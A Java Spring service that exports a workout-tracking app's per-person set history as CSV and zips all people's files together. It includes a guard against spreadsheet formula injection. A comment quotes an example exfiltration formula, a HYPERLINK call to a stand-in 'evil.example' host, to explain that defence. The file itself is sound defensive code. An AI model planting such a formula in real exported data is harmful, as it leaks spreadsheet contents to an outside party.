package com.worktrac.backend.export;

import com.worktrac.backend.person.Person;
import com.worktrac.backend.person.PersonDto;
import com.worktrac.backend.person.PersonService;
import com.worktrac.backend.stats.EpleyCalculator;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

@Service
public class CsvExportService {

    private static final DateTimeFormatter DATE_FMT = DateTimeFormatter.ofPattern("yyyy-MM-dd").withZone(ZoneOffset.UTC);
    // Seconds are part of the contract, not decoration: without them two sets logged in the same
    // minute are indistinguishable on the way back in, so an import cannot tell a genuine second
    // set from a duplicate of the first. See docs/architecture/import-export.md.
    private static final DateTimeFormatter TIME_FMT = DateTimeFormatter.ofPattern("HH:mm:ss").withZone(ZoneOffset.UTC);
    private static final DateTimeFormatter SESSION_START_FMT =
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss").withZone(ZoneOffset.UTC);

    private final PersonService personService;
    private final WorkoutRowProjection workoutRowProjection;
    private final EpleyCalculator epleyCalculator;

    public CsvExportService(PersonService personService, WorkoutRowProjection workoutRowProjection,
                             EpleyCalculator epleyCalculator) {
        this.personService = personService;
        this.workoutRowProjection = workoutRowProjection;
        this.epleyCalculator = epleyCalculator;
    }

    public record CsvExport(String filename, String content) {
    }

    public record ZipExport(String filename, byte[] content) {
    }

    // Columns and ordering match the design prototype's export exactly: one row per
    // set, Set # counted per-exercise-per-session, sessions oldest-first. Date/Time are
    // formatted in UTC (not the viewer's local time) since this is a server-generated
    // file with no per-request timezone signal -- a deliberate, documented divergence
    // from the prototype's client-local-time formatting.
    //
    // Session Start carries the session's own startedAt so a re-import can reconstruct exactly
    // which sets belonged to which workout. Without it an importer has to fall back to "one
    // session per day", which silently merges two workouts done on the same date.
    @Transactional(readOnly = true)
    public CsvExport export(Long accountId, Long personId) {
        Person person = personService.requireOwnedPerson(personId, accountId);

        List<List<String>> rows = new ArrayList<>();
        // Duration (sec) is blank for a strength set and Est. 1RM is blank for a hold -- an empty
        // cell is honest where the column doesn't apply, whereas a 0 reads as a real measurement.
        // Rest (sec) is blank for the same reason whenever it wasn't computed at all (see
        // WorkoutSet.restSeconds): a session's first set of an exercise, or anything logged
        // through the retroactive "past workout" editor.
        rows.add(List.of("Date", "Time", "Session Start", "Session Type", "Exercise", "Tags", "Favorite",
                "Custom Fields", "Exercise Note", "Session Note", "Set #", "Weight", "Unit", "Reps",
                "Duration (sec)", "Rest (sec)", "Est. 1RM"));

        for (ExportRow row : workoutRowProjection.project(person)) {
            boolean hold = row.isHold();
            rows.add(List.of(
                    DATE_FMT.format(row.createdAt()),
                    TIME_FMT.format(row.createdAt()),
                    SESSION_START_FMT.format(row.sessionStartedAt()),
                    row.manual() ? "Logged Later" : "Live",
                    row.exerciseName(),
                    formatTags(row),
                    row.favorite() ? "Yes" : "No",
                    formatCustomFields(row),
                    row.exerciseNote() != null ? row.exerciseNote() : "",
                    row.sessionNote() != null ? row.sessionNote() : "",
                    String.valueOf(row.setNumber()),
                    row.weight().toPlainString(),
                    row.unit(),
                    hold ? "" : String.valueOf(row.reps()),
                    hold ? String.valueOf(row.durationSeconds()) : "",
                    row.restSeconds() != null ? String.valueOf(row.restSeconds()) : "",
                    hold ? "" : epleyCalculator.estimate1RM(row.weight(), row.reps()).toPlainString()));
        }

        String csv = join(rows);

        String today = DATE_FMT.format(Instant.now());
        String filename = person.getName().replaceAll("\\s+", "-") + "-workout-data-" + today + ".csv";
        return new CsvExport(filename, csv);
    }

    // One CSV per person in the account, zipped together -- lets the "export all data"
    // Settings action download everyone's workout history in one request instead of
    // requiring a separate export per person. Reuses export() per person rather than
    // re-querying, so the two paths can never disagree on formatting.
    @Transactional(readOnly = true)
    public ZipExport exportAll(Long accountId) {
        List<PersonDto> people = personService.list(accountId);

        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        Set<String> usedEntryNames = new HashSet<>();
        try (ZipOutputStream zip = new ZipOutputStream(buffer)) {
            for (PersonDto person : people) {
                CsvExport csvExport = export(accountId, person.id());
                String entryName = csvExport.filename();
                if (!usedEntryNames.add(entryName)) {
                    // Two people share a display name -- disambiguate by id rather than
                    // silently overwriting or failing on a duplicate zip entry.
                    entryName = entryName.replace(".csv", "-" + person.id() + ".csv");
                    usedEntryNames.add(entryName);
                }
                zip.putNextEntry(new ZipEntry(entryName));
                zip.write(csvExport.content().getBytes(StandardCharsets.UTF_8));
                zip.closeEntry();
            }
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }

        String today = DATE_FMT.format(Instant.now());
        String filename = "workout-data-all-people-" + today + ".zip";
        return new ZipExport(filename, buffer.toByteArray());
    }

    // A StringBuilder, NOT stream().reduce((a, b) -> a + "\n" + b).
    //
    // That reduce was quadratic: string concatenation copies the whole accumulated result once
    // per row, so a full history cost O(n^2) in bytes moved. At 20,000 sets -- one import file's
    // worth, and a household can hold far more -- producing a ~3 MB file moved tens of gigabytes
    // through memory and pinned a CPU for the duration. Export is deliberately NOT Pro-gated
    // (every household can always take its data out), so this was reachable on Free, and getRaw
    // allows it 60 seconds, so the client waits rather than aborting. Repeated calls were a
    // straightforward way for one account to burn the container's CPU.
    //
    // Output is byte-for-byte identical, which CsvExportControllerTest pins -- the import side
    // matches on exact row identity, so a single separator moving would silently turn a re-import
    // into a pile of duplicates.
    private String join(List<List<String>> rows) {
        StringBuilder csv = new StringBuilder(rows.size() * 96);
        for (int i = 0; i < rows.size(); i++) {
            if (i > 0) {
                csv.append('\n');
            }
            List<String> row = rows.get(i);
            for (int column = 0; column < row.size(); column++) {
                if (column > 0) {
                    csv.append(',');
                }
                csv.append(csvEscape(row.get(column)));
            }
        }
        return csv.toString();
    }

    private String formatTags(ExportRow row) {
        return String.join("; ", row.tags());
    }

    // "Name: Value" pairs in the person's own sort order, matching how they appear in the
    // Configure Exercise sheet. A field with no value recorded yet shows just its name.
    private String formatCustomFields(ExportRow row) {
        return row.customFields().stream()
                .map(f -> f.value() != null && !f.value().isBlank()
                        ? f.name() + ": " + f.value()
                        : f.name())
                .collect(Collectors.joining("; "));
    }

    // Spreadsheet formula injection. Exercise names, tags, setup-field names and values, and both
    // kinds of note are all free text a household member typed, and they all land in a file that
    // is opened in Excel, Numbers or Sheets. A value starting = + - @ (or a tab/CR, which some
    // parsers treat the same way) is evaluated as a FORMULA by those applications, so a name like
    //   =HYPERLINK("https://evil.example/?d="&A1,"Click")
    // exfiltrates the sheet to whoever opens it. HYPERLINK and cell-reference tricks do not
    // prompt the way DDE does.
    //
    // The OWASP mitigation is a leading apostrophe, which those applications consume as "treat
    // the rest as text". CsvImportParser.stripFormulaGuard removes it again on the way back in,
    // so the round trip still yields the original string -- without that, exporting and
    // re-importing a name beginning with "-" would produce a DIFFERENT name and duplicate-
    // detection would stop recognising it.
    // THE definition. CsvImportParser reads this same constant rather than keeping its own
    // copy, so the set of characters the exporter guards and the set the importer unguards
    // cannot drift -- the same "one derivation, two consumers" rule the rest of the CSV round
    // trip follows (docs/architecture/import-export.md).
    public static final String FORMULA_TRIGGERS = "=+-@\t\r";

    // Package-private and static so CsvFormulaInjectionTest can assert the escaping directly,
    // with no database and no Spring context.
    static String csvEscape(String value) {
        if (value == null) {
            return "";
        }
        String escaped = value;
        if (!escaped.isEmpty() && FORMULA_TRIGGERS.indexOf(escaped.charAt(0)) >= 0) {
            escaped = "'" + escaped;
        }
        // A bare carriage return breaks row structure just as a newline does, and was missing
        // from this condition.
        if (escaped.contains(",") || escaped.contains("\"") || escaped.contains("\n")
                || escaped.contains("\r") || escaped.startsWith("'")) {
            return "\"" + escaped.replace("\"", "\"\"") + "\"";
        }
        return escaped;
    }
}
